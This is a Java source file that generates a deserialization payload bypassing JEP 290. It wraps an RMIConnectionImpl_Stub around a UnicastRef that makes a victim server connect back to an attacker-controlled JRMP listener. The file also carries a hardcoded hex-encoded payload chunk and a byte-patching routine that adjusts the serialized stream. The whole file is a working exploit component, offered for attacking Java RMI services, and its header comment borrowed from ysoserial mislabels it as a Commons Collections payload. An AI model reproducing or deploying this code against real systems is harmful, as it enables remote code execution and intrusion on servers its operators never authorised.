package payloads;


import sun.rmi.server.UnicastRef;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;

/***********************************************************
 * Deserialization payload for Apache Commons Collections
 * 3.1, 3.2, and 3.2.1.
 * 
 * Based on the ysoserial and the excellent work of Chris
 * Frohoff, Matthias Kaiser et al
 * (https://github.com/frohoff/ysoserial).
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BypassJEP290_RMIConnectionImpl_Stub {
	/*******************
	 * Properties
	 ******************/
	//jRMP服务器在本地127.0.0.1 1199的字节码poc
	private final String _header_chunk = "7372001e636f6d2e6c616c612e427970617373323930246c616c615f72656d6f74659e9f191ecc1d8bdb0200014c000372656674001b4c6a6176612f726d692f7365727665722f52656d6f74655265663b7078707372001973756e2e726d692e7365727665722e556e6963617374526566729ba1f19d8f4e0204000070787000093132372e302e302e31000004afc7ac9803097f8b1970bdf077000001728210160880010070";
	private String jrmpListenerHost= "";
	private int jrmpListenerPort = 0;
	/*******************
	 * Set payload properties
	 ******************/
	public BypassJEP290_RMIConnectionImpl_Stub(String jrmpListenerHost,int jrmpListenerPort) {
		this.jrmpListenerHost=jrmpListenerHost;
		this.jrmpListenerPort=jrmpListenerPort;
	}

	/*******************
	 * 组装生成回连字节码
	 ******************/
	public byte[] getBytes() {
		ByteArrayOutputStream out;
		out = new ByteArrayOutputStream();
		//Generate the payload bytes
		try {
			//Fix references in the header bytes and add them to the output

			UnicastRef ref = generateUnicastRef(this.jrmpListenerHost, this.jrmpListenerPort);
			//使用RMIConnectionImpl_Stub类
			RMIConnectionImpl_Stub RMIConnectionImpl_Stub_obj = new RMIConnectionImpl_Stub(ref);
			//序列化，修正
			byte[] serial_Primary=serialize(RMIConnectionImpl_Stub_obj);
			//除去aced开头
			byte[] serial_byte= new byte[serial_Primary.length-4];
			System.arraycopy(serial_Primary, 4, serial_byte, 0, serial_byte.length);
			//填入流
			out.write(this.fixReferences(serial_byte));

			//Return the payload bytes
			return out.toByteArray();
		} catch(IOException ioe) {
			;
		} catch (Throwable throwable) {
			throwable.printStackTrace();
		}
		return out.toByteArray();

	}

	//根据攻击包对比，在TC_ENDBLOCKDATA标记前，添加TC_NULL标签
	protected final byte[] fixReferences(byte[] original) {
		byte[] fixed = new byte[original.length+10];//此处数组变大是根据RMIConnectionImpl_Stub类调整的
		int refHandle;
		int j=0;
		//Copy the given bytes but correct reference handle values as required
		for(int i = 0; i < original.length; ++i) {
			//Check if there are enough bytes left in the original to contain a TC_REFERENCE
			if(i < (original.length - 5)) {
				//Look for a TC_REFERENCE at this offset
				if(original[i] == (byte)0x00 && original[i + 1] == (byte)0x00 && original[i + 2] == (byte)0x78) {
					//Copy the reference to the fixed byte array and skip over the bytes in the original
					fixed[j++] = (byte)0x00;
					fixed[j++] = (byte)0x00;
					fixed[j++] = (byte)0x70;
					fixed[j] = (byte)0x78;;
					i=i+2;
				} else {
					//Copy the byte straight across
					fixed[j] = original[i];
				}
			} else {
				//Copy the byte straight across
				fixed[j] = original[i];
			}
			j++;
		}

		//Return the fixed payload bytes
		return fixed;
	}

	//让受害者主动去连接的攻击者的JRMPlister的host和port
	public static UnicastRef generateUnicastRef(String host, int port) {
		java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
		sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
		sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
		return new UnicastRef(liveRef);
	}

	public static byte[] serialize(final Object obj) throws IOException {
		final ByteArrayOutputStream out = new ByteArrayOutputStream();
		serialize(obj, out);
		return out.toByteArray();
	}

	public static void serialize(final Object obj, final OutputStream out) throws IOException {
		final ObjectOutputStream objOut = new ObjectOutputStream(out);
		objOut.writeObject(obj);
	}




	protected final byte[] hexStrToByteArray(String hexStr) {
		byte[] data;

		//Create the byte array
		data = new byte[hexStr.length() / 2];

		//Convert the hex string to bytes
		for(int i = 0; i < hexStr.length(); i += 2) {
			data[i / 2] = (byte)((Character.digit(hexStr.charAt(i), 16) << 4) + Character.digit(hexStr.charAt(i + 1), 16));
		}

		//Return the resulting byte array
		return data;
	}
	public static final String bytesToHexString(byte[] bArray) {
		StringBuffer sb = new StringBuffer(bArray.length);
		String sTemp;
		for (int i = 0; i < bArray.length; i++) {
			sTemp = Integer.toHexString(0xFF & bArray[i]);
			if (sTemp.length() < 2)
				sb.append(0);
			sb.append(sTemp.toUpperCase());
		}
		return sb.toString();
	}
}
